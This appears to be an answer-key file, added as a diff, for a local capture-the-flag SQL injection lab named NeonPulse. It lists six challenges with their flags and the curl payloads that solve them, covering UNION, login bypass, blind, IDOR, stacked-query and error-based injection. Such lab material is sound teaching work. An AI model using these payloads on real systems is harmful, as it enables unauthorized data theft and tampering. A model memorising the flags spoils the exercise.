@@ -1,0 +1,100 @@
+===============================================================================
+  NeonPulse — SQL Injection Lab Solutions (Port 5001)
+===============================================================================
+
+CHALLENGE 1: UNION-Based SQL Injection (Search)
+Flag: FLAG{un10n_s3l3ct_m4st3r}
+
+  The /search endpoint concatenates user input into a LIKE query:
+    SELECT * FROM posts WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'
+
+  Inject a UNION SELECT to extract from the flags table:
+
+  curl "http://localhost:5001/search?q=' UNION SELECT 1,flag_name,flag_value,4,5,6 FROM flags--"
+
+  All flags from the flags table are returned as "posts".
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Authentication Bypass (Login)
+Flag: FLAG{4uth_byp4ss_sqli}
+
+  The /login endpoint uses:
+    SELECT * FROM users WHERE username='{username}' AND password='{password}'
+
+  Bypass with a comment to truncate the password check:
+
+  curl -X POST http://localhost:5001/login \
+    -d "username=admin'--&password=anything"
+
+  Alternative: username = ' OR 1=1--, password = anything
+  The admin dashboard appears with the flag.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: Blind Boolean-Based SQL Injection (Post)
+Flag: FLAG{bl1nd_sql1_pr0}
+
+  The /post/<id> endpoint is vulnerable to integer-based injection:
+    SELECT * FROM posts WHERE id = {post_id}
+
+  Test:
+    curl http://localhost:5001/post/1%20AND%201=1    (returns post)
+    curl http://localhost:5001/post/1%20AND%201=2    (returns nothing)
+
+  Extract the flag from the flags table character by character:
+    /post/1 AND (SELECT unicode(substr(flag_value,1,1)) FROM flags LIMIT 1)>64
+
+  Or use UNION directly:
+    curl "http://localhost:5001/post/1 UNION SELECT 1,flag_value,3,4,5,6 FROM flags WHERE flag_name='blind_flag'"
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: Profile IDOR + SQL Injection
+Flag: FLAG{sqli_profile_idor_4dm1n}
+
+  The /profile endpoint takes an id parameter with no authorization check:
+    SELECT * FROM users WHERE id = {id}
+
+  Simply access admin's profile:
+  curl "http://localhost:5001/profile?id=1"
+
+  The admin's secret_note field contains the flag.
+
+  UNION injection also works:
+  curl "http://localhost:5001/profile?id=1 UNION SELECT 1,2,3,4,flag_value FROM flags--"
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Stacked Queries (Admin Logs)
+Flag: FLAG{st4ck3d_qu3ry_h4ck}
+
+  The /admin/logs endpoint has a sort parameter:
+    SELECT * FROM admin_logs ORDER BY {sort}
+
+  The hidden logs have is_admin_visible=0. Use stacked queries to
+  make them visible:
+
+  curl "http://localhost:5001/admin/logs?sort=id;UPDATE admin_logs SET is_admin_visible=1 WHERE 1=1--"
+
+  Then visit the admin logs page again:
+  curl http://localhost:5001/admin/logs
+
+  The previously hidden log entry contains the flag.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 6: Error-Based SQL Injection (API)
+Flag: FLAG{3rr0r_b4s3d_l34k}
+
+  The /api/posts endpoint returns errors as JSON:
+    SELECT * FROM posts WHERE category = '{category}'
+
+  Force an error that leaks data via CAST:
+
+  curl "http://localhost:5001/api/posts?category=' AND 1=CAST((SELECT flag_value FROM flags WHERE flag_name='api_flag') AS INT)--"
+
+  The error message contains the flag value because SQLite tries
+  to cast the flag string as an integer and includes it in the error.
+
+===============================================================================
